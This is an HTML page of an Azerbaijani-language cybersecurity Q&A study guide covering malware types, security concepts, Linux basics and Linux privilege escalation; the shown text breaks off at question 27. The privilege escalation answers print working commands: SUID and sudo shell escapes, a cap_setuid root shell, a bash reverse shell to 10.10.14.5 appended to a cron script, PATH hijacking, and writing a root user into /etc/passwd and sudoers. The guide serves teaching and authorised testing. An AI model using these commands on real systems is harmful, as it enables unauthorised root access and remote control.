+<li><a href="#q148" data-q="q148"><span class="qn">148</span><span class="qt">Əsas database default portları hansılardır?</span></a></li>
+<li><a href="#q149" data-q="q149"><span class="qn">149</span><span class="qt">SQL Injection ilə kod icrası (reverse shell) texnikaları hansılardır?</span></a></li>
+<li><a href="#q150" data-q="q150"><span class="qn">150</span><span class="qt">SQL Injection-un qarşısı necə alınır (prevention metodları)?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat10">
+<button class="cat-btn" aria-expanded="false" data-target="cat10"><span class="cat-num">10</span><span class="cat-name">OWASP Top 10 — 2025</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q151" data-q="q151"><span class="qn">151</span><span class="qt">OWASP Top 10 — 2025 siyahısı nədir və hər kateqoriya nəyi əhatə edir?</span></a></li>
+<li><a href="#q152" data-q="q152"><span class="qn">152</span><span class="qt">OWASP Top 10 — 2021 və 2025 arasında nə dəyişdi?</span></a></li>
+</ul></li>
+  </ul><div class="no-result" id="noResult" hidden>Nəticə tapılmadı</div></nav>
+</aside>
+
+<main class="main">
+  <section class="hero">
+    <p class="tag">MilliSec · Qeydlər əsasında</p>
+    <h1>Suallar və Cavablar Toplusu</h1>
+    <p>Kibertəhlükəsizlik, İnformasiya Təhlükəsizliyi, Linux, Şəbəkə, Veb Pentest, Active Directory, Pivoting, Giriş Nəzarəti, SQL Injection və OWASP Top 10 — 2025.</p>
+    <div class="stats">
+      <div class="stat"><b>152</b><span>Sual</span></div>
+      <div class="stat"><b>10</b><span>Kateqoriya</span></div>
+      <div class="stat"><b>2025</b><span>OWASP Top 10</span></div>
+    </div>
+  </section>
+  <div class="content">
+<section class="cat-section" id="cat1">
+<header class="cat-head"><span class="cat-head-num">01</span><h2>Kibertəhlükəsizlik Əsasları</h2></header>
+<article class="qa" id="q1">
+<div class="qa-q"><span class="badge">Sual 1</span><h3>Ransomware nədir?</h3></div>
+<div class="qa-a">
+<p>Ransomware – kompüterə, telefona və ya serverə yoluxan zərərli proqramdır. Faylları şifrələyir (açılmaz hala salır) və onları açmaq üçün pul (fidyə) tələb edir.</p>
+<p>Sadə dillə: “Pul verməsən, fayllarını açmayacağam” deyən virusdur.</p>
+<h4 class="sub">Necə işləyir?</h4>
+<ul class="blist">
+<li>İstifadəçi zərərli faylı açır (crack proqram, email əlavəsi, saxta link).</li>
+<li>Ransomware sistemə düşür.</li>
+<li>Faylları kilidləyir (şifrələyir).</li>
+<li>Ekranda mesaj çıxır: “Faylları açmaq üçün X qədər pul ödə”.</li>
+</ul>
+</div></article>
+<article class="qa" id="q2">
+<div class="qa-q"><span class="badge">Sual 2</span><h3>Hacktivist qrup nədir?</h3></div>
+<div class="qa-a">
+<p>Hacktivist qrup – haker bacarıqlarından siyasi, ideoloji və ya sosial məqsədlər üçün istifadə edən qrupdur (Hack + Aktivizm = Hacktivism).</p>
+<p>Pul üçün yox, mesaj vermək üçün hücum edirlər.</p>
+<h4 class="sub">Məqsədləri</h4>
+<ul class="blist">
+<li>Hökumətə etiraz</li>
+<li>Senzuraya qarşı çıxmaq</li>
+<li>Sosial ədalətsizliyə qarşı çıxmaq</li>
+<li>Müharibəyə, işğala etiraz</li>
+<li>“İnformasiya azadlığı”</li>
+</ul>
+</div></article>
+<article class="qa" id="q3">
+<div class="qa-q"><span class="badge">Sual 3</span><h3>DoS və DDoS nədir, fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>DoS (Denial of Service) – bir kompüterdən serverə çoxlu sorğu göndərib onu işləməz hala salmaqdır. Məqsəd: saytı yavaşlatmaq və ya tamamilə açılmaz etmək.</p>
+<h4 class="sub">DoS xüsusiyyətləri</h4>
+<ul class="blist">
+<li>1 hücumçu</li>
+<li>1 mənbə IP</li>
+<li>Aşkarlamaq daha asandır</li>
+</ul>
+<p>DDoS (Distributed Denial of Service) – minlərlə, bəzən milyonlarla cihazdan eyni anda edilən hücumdur. Bu cihazlar adətən botnet-dir (virus yoluxmuş kompüterlər, kameralar, routerlər).</p>
+<h4 class="sub">DDoS xüsusiyyətləri</h4>
+<ul class="blist">
+<li>Çoxlu mənbə IP</li>
+<li>Güclü və uzunmüddətli hücum</li>
+<li>Bloklamaq çox çətindir</li>
+</ul>
+</div></article>
+<article class="qa" id="q4">
+<div class="qa-q"><span class="badge">Sual 4</span><h3>Zero Trust nədir?</h3></div>
+<div class="qa-a">
+<p>Zero Trust – “Heç kimə avtomatik güvənmə” prinsipi ilə qurulan təhlükəsizlik modelidir. Şüarı: Never trust, always verify (heç vaxt güvənmə, hər zaman yoxla).</p>
+<h4 class="sub">Niyə lazım oldu?</h4>
+<p>Əvvəllər daxili şəbəkə etibarlı, xarici şəbəkə təhlükəli sayılırdı. Amma VPN sındırıla bilər, daxili istifadəçi səhv edə bilər, zərərli proqram içəri düşə bilər. Ona görə “hər kəs şübhəlidir” yanaşması yarandı.</p>
+<h4 class="sub">Necə işləyir?</h4>
+<p>Hər girişdə sistem yoxlayır: İstifadəçi kimdir? Parol + MFA varmı? Cihaz təhlükəsizdirmi? Haradan qoşulur? Nəyə giriş istəyir? Yalnız hamısı uyğundursa icazə verilir.</p>
+<h4 class="sub">Əsas prinsiplər</h4>
+<ul class="blist">
+<li>Heç kimə avtomatik güvənmə (daxili şəbəkədə olsa belə).</li>
+<li>Minimum səlahiyyət – istifadəçi yalnız lazım olan qədər giriş alır.</li>
+<li>Davamlı yoxlama – bir dəfə yoxlama yetərli deyil.</li>
+<li>Segmentasiya – şəbəkə hissələrə bölünür.</li>
+</ul>
+</div></article>
+<article class="qa" id="q5">
+<div class="qa-q"><span class="badge">Sual 5</span><h3>Script Kiddie nədir?</h3></div>
+<div class="qa-a">
+<p>Script Kiddie – öz bilikləri az olan, amma başqalarının yazdığı hazır alət və skriptlərlə hücum edən şəxsdir. Yəni nə etdiyini tam bilmədən hack edən adam.</p>
+<h4 class="sub">Xüsusiyyətləri</h4>
+<ul class="blist">
+<li>Öz exploit yazmır.</li>
+<li>Hazır tool istifadə edir (SQLmap, LOIC, Metasploit).</li>
+<li>Texniki biliyi zəifdir.</li>
+<li>Əsas məqsəd: “özünü göstərmək”.</li>
+</ul>
+<h4 class="sub">Hansı hücumları edirlər?</h4>
+<ul class="blist">
+<li>Sadə brute-force</li>
+<li>DoS / zəif DDoS</li>
+<li>Avtomatik vulnerability scan</li>
+<li>Deface (hazır exploitlə)</li>
+</ul>
+</div></article>
+<article class="qa" id="q6">
+<div class="qa-q"><span class="badge">Sual 6</span><h3>Backdoor nədir?</h3></div>
+<div class="qa-a">
+<p>Backdoor – sistemdə gizli giriş yoludur. Bu yolla parol bilmədən, normal yoxlamalardan keçmədən və istifadəçinin xəbəri olmadan sistemə daxil olmaq olur.</p>
+<p>Sadə dillə: Backdoor = evin gizli arxa qapısı.</p>
+<h4 class="sub">Backdoor necə yaranır?</h4>
+<ul class="blist">
+<li>Zərərli proqramla (crack, keygen, trojan).</li>
+<li>Hücumçunun özü qoyur – sistemi sındırır, sonra rahat girmək üçün backdoor saxlayır.</li>
+<li>Developer səhvi (nadir) – test üçün qoyulur və unudulur.</li>
+</ul>
+<h4 class="sub">Backdoor nə edə bilər?</h4>
+<ul class="blist">
+<li>Faylları oxuya/silə bilər.</li>
+<li>Kamera, mikrofon aktiv edə bilər.</li>
+<li>Keylogger işlədə bilər.</li>
+<li>Botnet-ə qoşa bilər.</li>
+<li>Sonradan ransomware yükləyə bilər.</li>
+</ul>
+</div></article>
+<article class="qa" id="q7">
+<div class="qa-q"><span class="badge">Sual 7</span><h3>Trojan nədir?</h3></div>
+<div class="qa-a">
+<p>Trojan (Trojan Horse) – özünü faydalı proqram kimi göstərən, amma içində zərərli kod gizlədən virus növüdür. Adı Troya atından gəlir.</p>
+<h4 class="sub">Necə yayılır?</h4>
+<ul class="blist">
+<li>Crack / pirat proqram</li>
+<li>Email əlavəsi</li>
+<li>Saxta download link</li>
+<li>Oyun modları, patch-lər</li>
+</ul>
+<p>İstifadəçi özü açır, virus içəri girir.</p>
+<h4 class="sub">Nə edə bilər?</h4>
+<ul class="blist">
+<li>Backdoor yaradar</li>
+<li>Keylogger işlədər</li>
+<li>Kamera/mikrofon açar</li>
+<li>Faylları oğurlayar</li>
+<li>Botnet-ə qoşar</li>
+</ul>
+</div></article>
+<article class="qa" id="q8">
+<div class="qa-q"><span class="badge">Sual 8</span><h3>DNS hücumları nədir?</h3></div>
+<div class="qa-a">
+<p>DNS hücumları – DNS sistemini hədəf alan kiber hücumlardır. DNS-in işi domain adını IP-yə çevirməkdir (google.com → 8.8.8.8). DNS sıradan çıxsa, internet də işləməz.</p>
+<h4 class="sub">Məqsədləri</h4>
+<ul class="blist">
+<li>Saytları əlçatmaz etmək</li>
+<li>İstifadəçini saxta sayta yönləndirmək</li>
+<li>Məlumat oğurlamaq</li>
+<li>Böyük sistemləri çökdürmək</li>
+</ul>
+<h4 class="sub">Ən yayğın növlər</h4>
+<ul class="blist">
+<li>DNS Spoofing (Cache Poisoning) – DNS cavabı saxtalaşdırılır, istifadəçi saxta IP-yə yönləndirilir.</li>
+<li>DNS Amplification (DDoS) – kiçik sorğu böyük cavab; DNS serverləri vasitəçi kimi istifadə olunur.</li>
+<li>DNS Flood – serverə həddən artıq sorğu, sayt açılmır.</li>
+<li>DNS Tunneling – DNS içində məlumat ötürülür, firewall çox vaxt görmür.</li>
+<li>Domain Hijacking – domain nəzarəti ələ keçirilir, DNS record dəyişdirilir.</li>
+</ul>
+</div></article>
+<article class="qa" id="q9">
+<div class="qa-q"><span class="badge">Sual 9</span><h3>Rootkit və Bootkit nədir, fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>Rootkit – sistemdə tam səlahiyyət (root/admin) qazanan və özünü gizlədən zərərli proqramdır. Əsas məqsədi: özünü və digər virusları gizlətmək, uzun müddət sistemdə qalmaq.</p>
+<p>Sadə dillə: Rootkit = sistemin kralı + görünməz.</p>
+<h4 class="sub">Rootkit nə edə bilər?</h4>
+<ul class="blist">
+<li>Antivirusu aldadar</li>
+<li>Faylları və prosesləri gizlədər</li>
+<li>Backdoor saxlayar</li>
+<li>Keylogger işlədər</li>
+</ul>
+<h4 class="sub">Rootkit növləri</h4>
+<ul class="blist">
+<li>User-mode rootkit</li>
+<li>Kernel-mode rootkit (çox təhlükəli)</li>
+<li>Firmware rootkit</li>
+</ul>
+<p>Bootkit – kompüter açılmamışdan əvvəl işləyən rootkit növüdür. Boot sector / UEFI-ni yoluxdurur, Windows başlamadan və antivirusdan əvvəl aktiv olur.</p>
+<h4 class="sub">Rootkit vs Bootkit</h4>
+<ul class="blist">
+<li>İşə düşmə: Rootkit OS yükləndikdən sonra, Bootkit OS-dən əvvəl.</li>
+<li>Gizlilik: Rootkit yüksək, Bootkit çox yüksək.</li>
+<li>Təmizləmə: Rootkit çətin, Bootkit çox çətin.</li>
+<li>Hədəf: Rootkit OS/Kernel, Bootkit Boot/UEFI.</li>
+</ul>
+</div></article>
+<article class="qa" id="q10">
+<div class="qa-q"><span class="badge">Sual 10</span><h3>Insider və Insider Threat nədir?</h3></div>
+<div class="qa-a">
+<p>Insider – təşkilatın içində olan, sistemlərə qanuni girişi olan şəxsdir (işçi, keçmiş işçi, müqaviləli əməkdaş, partnyor).</p>
+<p>Insider Threat – daxildən gələn təhlükədir. Hücum çöldən yox, içəridən olur.</p>
+<h4 class="sub">Insider növləri</h4>
+<ul class="blist">
+<li>Malicious Insider (qəsdən) – qəsdən zərər verir, məlumat oğurlayır, sabotaj edir. Motiv: pul, qisas, ideologiya.</li>
+<li>Negligent Insider (səhlənkar) – şifrəni paylaşır, phishing linkə klikləyir, USB taxır. Ən çox rast gəlinən növdür.</li>
+<li>Compromised Insider (ələ keçirilmiş) – hesabı sındırılıb, hücumçu onun adı ilə girir. “Qanuni” göründüyü üçün çox təhlükəlidir.</li>
+</ul>
+<h4 class="sub">Insider nə edə bilər?</h4>
+<ul class="blist">
+<li>Məlumat sızdıra bilər</li>
+<li>Sistemləri poza bilər</li>
+<li>Backdoor qoya bilər</li>
+<li>Ransomware işə sala bilər</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat2">
+<header class="cat-head"><span class="cat-head-num">02</span><h2>İnformasiya Təhlükəsizliyi və Anlayışlar</h2></header>
+<article class="qa" id="q11">
+<div class="qa-q"><span class="badge">Sual 11</span><h3>Məxfilik (Privacy) nədir?</h3></div>
+<div class="qa-a">
+<p>Məxfilik – şəxsi məlumatların qorunması və nəzarət altında saxlanması prinsipidir. Sadə dillə: “Mənim məlumatım mənim əlimdədir, başqası onu icazəsiz görə bilməz.”</p>
+<h4 class="sub">Hansı məlumatları əhatə edir?</h4>
+<ul class="blist">
+<li>Ad, soyad, şəxsiyyət nömrəsi</li>
+<li>Telefon, email, ünvan</li>
+<li>Bank məlumatları</li>
+<li>Sağlamlıq/tibbi məlumatlar</li>
+<li>Online davranışlar (cookies, IP, axtarış tarixçəsi)</li>
+</ul>
+<h4 class="sub">Yaddaş qaydası</h4>
+<ul class="blist">
+<li>Məxfi məlumat = şəxsi, özəl məlumat</li>
+<li>Gizli məlumat = şirkət/təşkilat üçün qorunan məlumat</li>
+</ul>
+<p>Tam məlumat (Complete/Full) – bütün detallarına qədər olan, heç bir hissəsi əskik olmayan məlumat. Əlçatan məlumat (Accessible) – istifadəçilərin rahatlıqla əldə edə biləcəyi məlumat.</p>
+</div></article>
+<article class="qa" id="q12">
+<div class="qa-q"><span class="badge">Sual 12</span><h3>CIA Triadı nədir?</h3></div>
+<div class="qa-a">
+<p>CIA Triadı – informasiya təhlükəsizliyinin 3 əsas prinsipidir (kəşfiyyatla əlaqəsi yoxdur): Confidentiality (Məxfilik), Integrity (Tamlıq), Availability (Əlçatanlıq).</p>
+<h4 class="sub">Confidentiality (Məxfilik)</h4>
+<p>Məlumatı icazəsiz şəxslərdən qorumaq (parollar, şəxsi məlumatlar, gizli sənədlər). Qorunma: şifrələmə, access control, MFA. Pozulsa: data leak, privacy breach.</p>
+<h4 class="sub">Integrity (Tamlıq / Dəqiqlik)</h4>
+<p>Məlumatın dəyişdirilməməsini və düzgün qalmasını təmin edir. Qorunma: Hash (SHA, MD5), digital signature, file integrity monitoring. Pozulsa: saxta data, sistem səhv qərar verər.</p>
+<h4 class="sub">Availability (Əlçatanlıq)</h4>
+<p>Məlumatın lazım olan vaxtda əlçatan olması. Qorunma: backup, load balancing, DDoS protection. Pozulsa: DoS/DDoS, sistem down.</p>
+</div></article>
+<article class="qa" id="q13">
+<div class="qa-q"><span class="badge">Sual 13</span><h3>Şəbəkə, Tətbiq və IoT təhlükəsizliyi nədir?</h3></div>
+<div class="qa-a">
+<p>Şəbəkə təhlükəsizliyi (Network Security) – şəbəkə və onun üzərindəki məlumatları icazəsiz giriş, hücum və zərərli proqramlardan qorumaq fəaliyyətidir.</p>
+<p>Application Security (Tətbiq Təhlükəsizliyi) – proqramların və tətbiqlərin zərərli hücumlardan qorunması fəaliyyətidir (“app işləyir, amma hacker onu poza bilməsin”).</p>
+<p>IoT Təhlükəsizliyi – “ağıllı” cihazların və onların şəbəkəyə bağlı sistemlərinin zərərli hücumlardan qorunmasıdır.</p>
+<h4 class="sub">IoT niyə vacibdir?</h4>
+<ul class="blist">
+<li>IoT cihazları adətən zəif şifrələnir.</li>
+<li>24/7 internetə bağlıdır.</li>
+<li>Hack olunsa şəxsi/biznes məlumatları sızır.</li>
+<li>Botnet hücumları üçün istifadə oluna bilər.</li>
+</ul>
+<h4 class="sub">IoT təhlükəsizliyi tədbirləri</h4>
+<ul class="blist">
+<li>Güclü və unik parol.</li>
+<li>Firmware/software update-lərini vaxtında et.</li>
+<li>Şifrələmə və VPN istifadə et.</li>
+<li>Monitorinq (anomal davranış aşkar et).</li>
+<li>IoT cihazları üçün ayrı VLAN / segmentasiya.</li>
+</ul>
+</div></article>
+<article class="qa" id="q14">
+<div class="qa-q"><span class="badge">Sual 14</span><h3>Pentest və Red Teaming fərqi nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Məqsəd: Pentest zəiflikləri tapmaq; Red Teaming real hücumun simulyasiyası.</li>
+<li>Çərçivə: Pentest qısa, məhdud; Red Teaming uzun, geniş, bütün sistemi əhatə edir.</li>
+<li>Hücum növü: Pentest adətən texniki; Red Teaming texniki + fiziki + sosial mühəndislik.</li>
+<li>Nəticə: Pentest report + fix; Red Teaming report + təhlükəsizlik səviyyəsini yoxlamaq.</li>
+</ul>
+<p>Qısa: Pentest = sistemi test etmək; Red Teaming = haker kimi bütün hücumları simulyasiya etmək.</p>
+</div></article>
+<article class="qa" id="q15">
+<div class="qa-q"><span class="badge">Sual 15</span><h3>Virus nədir və növləri hansılardır?</h3></div>
+<div class="qa-a">
+<p>Virus – özünü digər fayllara və sistemə yayan zərərli proqramdır (“özünü kopyalayaraq sistemi yoluxduran proqram”).</p>
+<h4 class="sub">Xüsusiyyətləri</h4>
+<ul class="blist">
+<li>Özünü başqa fayllara/proqramlara yapışdırır.</li>
+<li>İstifadəçi viruslu faylı açdıqda aktiv olur.</li>
+<li>Sistemə ziyan verə bilər (fayl silmək, yavaşlatmaq, məlumat sızdırmaq).</li>
+<li>Antivirus proqramları ilə aşkarlana bilər.</li>
+</ul>
+<h4 class="sub">Virus növləri</h4>
+<ul class="blist">
+<li>File infector – faylın içinə yapışır (məs: CIH/Chernobyl).</li>
+<li>Macro virus – Office sənədlərində işləyir (məs: Melissa).</li>
+<li>Boot sector virus – diskin boot sektorunu yoluxdurur (məs: Stone, Michelangelo).</li>
+<li>Polymorphic virus – özünü dəyişərək antivirusdan gizlənir.</li>
+<li>Metamorphic virus – tamamilə kodunu dəyişir, ən mürəkkəb növdür.</li>
+</ul>
+</div></article>
+<article class="qa" id="q16">
+<div class="qa-q"><span class="badge">Sual 16</span><h3>Worm nədir və növləri hansılardır?</h3></div>
+<div class="qa-a">
+<p>Worm (solucan) – özünü digər kompüterlərə avtomatik yayan zərərli proqramdır (“istifadəçiyə ehtiyac olmadan öz-özünə yayılan virus”).</p>
+<h4 class="sub">Xüsusiyyətləri</h4>
+<ul class="blist">
+<li>Faylı açmağa ehtiyac yoxdur (avtomatik yayılır).</li>
+<li>Şəbəkə və ya internet üzərindən yayılır.</li>
+<li>Sistem resurslarını tükəndirə bilər (CPU, RAM, bant genişliyi).</li>
+<li>Digər zərərli proqramları da yayıra bilər.</li>
+</ul>
+<h4 class="sub">Worm növləri</h4>
+<ul class="blist">
+<li>Email Worm – email kontaktlara avtomatik göndərir (məs: ILOVEYOU).</li>
+<li>Network Worm – şəbəkə boşluqlarından istifadə edir (məs: WannaCry).</li>
+<li>Internet Worm – veb server zəifliklərini istifadə edir (məs: Code Red).</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat3">
+<header class="cat-head"><span class="cat-head-num">03</span><h2>Linux Əsasları</h2></header>
+<article class="qa" id="q17">
+<div class="qa-q"><span class="badge">Sual 17</span><h3>Linux fayl sisteminin əsas qovluqları hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>/ (root) – fayl sisteminin ən yuxarı səviyyəsi; bütün qovluqlar burada yerləşir (Windows-dakı C:\ kimi).</li>
+<li>/bin – əsas icra edilə bilən proqramlar (ls, cp, mv, cat, bash).</li>
+<li>/sbin – sistem idarəsi proqramları (fdisk, ifconfig, reboot, shutdown), adətən root üçün.</li>
+<li>/usr – istifadəçi proqramları, kitabxanalar (/usr/bin, /usr/sbin, /usr/lib).</li>
+<li>/etc – sistem konfiqurasiya faylları (/etc/passwd, /etc/hostname, /etc/fstab).</li>
+<li>/home – istifadəçilərin şəxsi qovluqları (/home/chuck).</li>
+<li>/root – root istifadəçisinin ev qovluğu.</li>
+<li>/tmp – müvəqqəti fayllar; restart-da adətən silinir.</li>
+<li>/var – dəyişkən məlumatlar (/var/log, /var/mail, /var/tmp).</li>
+<li>/lib – sistem kitabxanaları (.so faylları), /lib/modules → kernel modulları.</li>
+<li>/dev – hardware cihazları fayl kimi (/dev/sda, /dev/tty).</li>
+<li>/mnt və /media – disk/USB mount qovluqları (mnt admin tərəfindən, media avtomatik).</li>
+<li>/opt – əlavə (optional) proqramlar.</li>
+<li>/boot – kernel və bootloader faylları (/boot/vmlinuz, /boot/grub).</li>
+<li>/proc – virtual fayl sistemi; kernel/proses məlumatı (/proc/cpuinfo, /proc/meminfo).</li>
+<li>/sys – sistem və cihaz məlumatı (virtual fayl sistemi).</li>
+<li>/run – işləyiş zamanı yaradılan runtime məlumatlar (PID faylları).</li>
+</ul>
+</div></article>
+<article class="qa" id="q18">
+<div class="qa-q"><span class="badge">Sual 18</span><h3>systemctl-də start, stop, enable, disable nə edir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>start – servisi indi işə salır (məs: sudo systemctl start apache2).</li>
+<li>stop – servisi indi dayandırır.</li>
+<li>enable – servisi boot zamanı avtomatik başlamağa aktiv edir.</li>
+<li>disable – servisin boot zamanı avtomatik başlamasını qadağan edir.</li>
+</ul>
+<p>Qısa: start/stop indi təsir edir; enable/disable gələcək restart-larda təsir edir.</p>
+</div></article>
+<article class="qa" id="q19">
+<div class="qa-q"><span class="badge">Sual 19</span><h3>Environment Variable nədir?</h3></div>
+<div class="qa-a">
+<p>Environment variable – sistem və proqramlara məlumat ötürən dəyişəndir; proqramların iş mühitini müəyyən edən parametrdir.</p>
+<h4 class="sub">Misallar</h4>
+<ul class="blist">
+<li>PATH – əmrlər icra edilərkən sistemin hansı qovluqlara baxacağını göstərir.</li>
+<li>HOME – istifadəçinin ev qovluğu.</li>
+<li>USER – hal-hazırkı istifadəçi adı.</li>
+</ul>
+<h4 class="sub">Növləri</h4>
+<ul class="blist">
+<li>Sistem səviyyəli (global) – bütün istifadəçilər üçün; /etc/environment, /etc/profile.</li>
+<li>İstifadəçi səviyyəli (local) – yalnız bir istifadəçi üçün; .bashrc, .zshrc.</li>
+</ul>
+<p>Yeni dəyişən: export MY_VAR=&quot;Hello World&quot; (yalnız o shell sessiyası üçün). Daimi etmək üçün .bashrc/.zshrc faylına əlavə edilir.</p>
+</div></article>
+<div class="note"><span class="note-label">Qeyd</span><p>Linux Privilege Escalation — aşağı səviyyəli istifadəçidən (məs. <code>www-data</code>) <strong>root</strong>-a qalxma prosesidir. Aşağıdakı metodlar yalnız icazəli mühitdə (CTF lab, öz sistemin, müştəri ilə razılaşdırılmış pentest) istifadə üçündür.</p></div>
+<article class="qa" id="q20">
+<div class="qa-q"><span class="badge">Sual 20</span><h3>Linux privesc nədir və enumeration necə aparılır?</h3></div>
+<div class="qa-a">
+<p>Privilege escalation – mövcud (məhdud) istifadəçi hüququndan daha yüksək hüquqa (adətən root) keçməkdir. İlk addım həmişə <strong>enumeration</strong>-dır: sistemi tanımaq, səhv konfiqurasiya və zəiflik axtarmaq.</p>
+<h4 class="sub">Avtomatik alətlər</h4>
+<ul class="blist">
+<li>LinPEAS – ən geniş avtomatik enum skripti (SUID, sudo, cron, cred, kernel).</li>
+<li>LinEnum / linux-smart-enumeration (lse.sh) – sürətli ümumi yoxlama.</li>
+<li>linux-exploit-suggester (les.sh) – kernel versiyasına uyğun exploit təklif edir.</li>
+<li>pspy – root icazəsi olmadan işləyən prosesləri/cron-ları real-time izləyir.</li>
+</ul>
+<h4 class="sub">Manual yoxlamalar</h4>
+<pre class="code"><code>id; whoami; sudo -l
+uname -a; cat /etc/os-release
+ps aux | grep root
+netstat -tulpn ; ss -tulpn
+find / -perm -4000 -type f 2&gt;/dev/null
+cat /etc/crontab; ls -la /etc/cron*
+getcap -r / 2&gt;/dev/null
+env; cat ~/.bash_history</code></pre>
+<p>Mindset: “Hansı şey root kimi işləyir və mənim ona təsir imkanım varmı?”</p>
+</div></article>
+<article class="qa" id="q21">
+<div class="qa-q"><span class="badge">Sual 21</span><h3>SUID/SGID binariləri ilə privesc (GTFOBins) necədir?</h3></div>
+<div class="qa-a">
+<p><strong>SUID</strong> (Set User ID) bit-i olan fayl, onu işə salan istifadəçinin yox, fayl <strong>sahibinin</strong> (çox vaxt root) hüququ ilə icra olunur. SGID isə qrup hüququ ilə işləyir.</p>
+<h4 class="sub">Tapmaq</h4>
+<pre class="code"><code>find / -perm -4000 -type f 2&gt;/dev/null   # SUID
+find / -perm -2000 -type f 2&gt;/dev/null   # SGID</code></pre>
+<h4 class="sub">İstismar (GTFOBins nümunələri)</h4>
+<ul class="blist">
+<li>find – <code>find . -exec /bin/sh -p \; -quit</code></li>
+<li>bash (SUID) – <code>bash -p</code> (effektiv UID saxlanılır).</li>
+<li>vim/nano – fayl içindən shell açmaq / həssas fayl oxumaq.</li>
+<li>cp – SUID cp ilə /etc/passwd üzərinə yazmaq.</li>
+<li>nmap (köhnə) – <code>nmap --interactive</code> → <code>!sh</code>.</li>
+</ul>
+<p><strong>GTFOBins</strong> (gtfobins.github.io) – hansı binarinin SUID/sudo halında necə istismar olunduğunu göstərən əsas mənbədir.</p>
+</div></article>
+<article class="qa" id="q22">
+<div class="qa-q"><span class="badge">Sual 22</span><h3>Sudo səhv konfiqurasiyaları ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>İlk yoxlama: <code>sudo -l</code> – istifadəçinin hansı əmrləri (və hansı user kimi) parolsuz/şərtlə icra edə biləcəyini göstərir.</p>
+<h4 class="sub">Əsas vektorlar</h4>
+<ul class="blist">
+<li>NOPASSWD ilə təhlükəli binari – GTFOBins-ə uyğun shell almaq (məs. <code>sudo vim -c ':!/bin/sh'</code>).</li>
+<li>Wildcard / istənilən binari icazəsi – birbaşa root shell.</li>
+<li>LD_PRELOAD / LD_LIBRARY_PATH – əgər <code>env_keep+=LD_PRELOAD</code> varsa, zərərli .so yüklədib root shell.</li>
+<li>sudoedit / yazıla bilən script – sudo ilə çağırılan script-ə kod əlavə etmək.</li>
+</ul>
+<h4 class="sub">Məşhur CVE-lər</h4>
+<ul class="blist">
+<li>CVE-2021-3156 (Baron Samedit) – sudo heap overflow, parolsuz root.</li>
+<li>CVE-2019-14287 – <code>sudo -u#-1 id</code> (Runas ALL, !root konfiqurasiyasını bypass).</li>
+</ul>
+<pre class="code"><code>sudo -l
+# Misal: (root) NOPASSWD: /usr/bin/find
+sudo find . -exec /bin/sh \; -quit</code></pre>
+</div></article>
+<article class="qa" id="q23">
+<div class="qa-q"><span class="badge">Sual 23</span><h3>Linux Capabilities ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>Capabilities – root hüququnu kiçik hissələrə bölür; bir binariyə tam SUID vermədən müəyyən imtiyaz vermək olar. Səhv verilmiş capability privesc-ə aparır.</p>
+<h4 class="sub">Tapmaq və istismar</h4>
+<pre class="code"><code>getcap -r / 2&gt;/dev/null
+# Təhlükəli: cap_setuid+ep python3-də
+./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></pre>
+<ul class="blist">
+<li>cap_setuid – UID-i 0-a dəyişmək (python, perl, ruby varsa kritikdir).</li>
+<li>cap_dac_read_search – istənilən faylı oxumaq (/etc/shadow).</li>
+<li>cap_dac_override – fayl icazələrini bypass edib yazmaq.</li>
+</ul>
+</div></article>
+<article class="qa" id="q24">
+<div class="qa-q"><span class="badge">Sual 24</span><h3>Cron job-lar ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>Root kimi işləyən cron tapşırığı zəif konfiqurasiya olunubsa, onun çağırdığı script/binari ələ keçirilə bilər.</p>
+<ul class="blist">
+<li>Yazıla bilən script – root cron-un çağırdığı script-ə reverse shell əlavə et.</li>
+<li>PATH abuse – /etc/crontab-da <code>PATH</code> writable qovluq daxildirsə, eyni adlı saxta binari qoy.</li>
+<li>Wildcard injection – cron tar/script-də <code>*</code> istifadə edirsə, arqument faylları ilə inject.</li>
+<li>pspy ilə gizli (crontab-da görünməyən) tapşırıqları aşkar et.</li>
+</ul>
+<pre class="code"><code>cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily
+# writable script tapıldıqda:
+echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1' &gt;&gt; /path/script.sh</code></pre>
+</div></article>
+<article class="qa" id="q25">
+<div class="qa-q"><span class="badge">Sual 25</span><h3>PATH hijacking (relative path) ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>SUID binari və ya root script daxildə əmri <strong>tam yol olmadan</strong> (məs. <code>cat</code> yox <code>/bin/cat</code>) çağırırsa, PATH-ə yazıla bilən qovluq əlavə edib saxta binari yerləşdirmək olar.</p>
+<pre class="code"><code>strings ./vuln_suid    # daxildə 'cat' kimi relative çağırış görünür
+cd /tmp
+echo '/bin/sh -p' &gt; cat
+chmod +x cat
+export PATH=/tmp:$PATH
+./vuln_suid           # 'cat' əvəzinə bizim sh işləyir</code></pre>
+</div></article>
+<article class="qa" id="q26">
+<div class="qa-q"><span class="badge">Sual 26</span><h3>Yazıla bilən /etc/passwd, /etc/shadow, /etc/sudoers necə istismar edilir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li><strong>/etc/passwd yazıla bilirsə</strong> – UID 0 olan yeni root istifadəçi əlavə et.</li>
+<li><strong>/etc/shadow oxunursa</strong> – hash-ları götür, John/Hashcat ilə crack et.</li>
+<li><strong>/etc/sudoers yazıla bilirsə</strong> – özünə NOPASSWD ALL ver.</li>
+</ul>
+<pre class="code"><code># Yeni root user (passwd writable):
+openssl passwd -1 -salt xx parol123      # hash yarat
+echo 'hacker:$1$xx$...:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+su hacker
+
+# sudoers writable:
+echo 'www-data ALL=(ALL) NOPASSWD: ALL' &gt;&gt; /etc/sudoers</code></pre>
+</div></article>
+<article class="qa" id="q27">
